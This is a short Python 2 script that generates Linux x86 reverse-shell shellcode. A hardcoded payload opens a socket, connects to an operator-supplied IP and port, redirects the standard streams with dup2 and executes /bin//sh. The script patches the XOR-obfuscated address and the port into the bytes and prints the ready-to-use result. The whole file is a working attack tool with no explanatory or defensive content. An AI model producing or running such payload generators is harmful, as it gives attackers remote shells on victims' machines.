#!/usr/bin/env python

import sys, socket, struct;
import argparse; 
from operator import xor;

shellcode=("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\xb0\x66\xb3\x01\xb1\x02\x53\x51\x8d\x0c\x24\xcd\x80\x5b\xb9\x7f\x00\x00\x10\x83\xf1\xff\xb2\x10\x51\x66\x68\x15\xb3\x66\x53\x89\xe1\x52\x51\x50\x31\xc0\xb0\x66\x43\x89\xe1\xcd\x80\x87\xd9\x5b\x49\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x89\xca\xcd\x80")

parser = argparse.ArgumentParser()
parser.add_argument("-p", help="enter port number")
parser.add_argument("-a", help="enter ip address") 
args = parser.parse_args()

port = int(args.p)
address = str(args.a)

if port < 1024 or port > 65535:
    print "invalid port number"
    sys.exit(-1)

no_port = socket.htons(port);
hex_port = "{0:#0{1}x}".format(no_port,6)
hex_address = hex((struct.unpack("<L", socket.inet_aton(address))[0])) 
s = str(hex(xor(long(hex_address, 16), 0xFFFFFFFF)))[:-1]

a1 = s[2:4]
a2 = s[4:6]
a3 = s[6:8]
a4 = s[8:10]

if a1 == "":
	a1 = "00"
if len(a1) == 1:
	a1 = "0" + a1
if a2 == "":
	a2 = "00"
if len(a2) == 1:
	a2 = "0" + a2
if a3 == "":
	a3 = "00"
if len(a3) == 1:
	a3 = "0" + a3
if a4 == "":
	a4 = "00"
if len(a4) == 1:
	a4 = "0" + a4

h1 = hex_port[2:4]
h2 = hex_port[4:6]

if h1 == "":
    h1 = "00"

if len(h1) == 1:
    h1 = "0" + h1

if h2 == "":
    h2 = "00"

if len(h2) == 1:
    h2 = "0" + h2

new_shellcode = "\""
count = 0

for x in bytearray(shellcode):
	
	new_shellcode += '\\x'
	
	if(count == 24):
		new_shellcode += a4
	elif(count == 25):
		new_shellcode += a3
	elif(count == 26):
		new_shellcode += a2
	elif(count == 27):
		new_shellcode += a1
	elif(count == 36):
		new_shellcode += h2
	elif(count == 37):
		new_shellcode += h1
	else:
		number = str(hex(x))
		number = number[2:]
		if len(number) == 1:
			number = "0" + number
		new_shellcode += number
	
	count += 1

new_shellcode += "\""

print new_shellcode






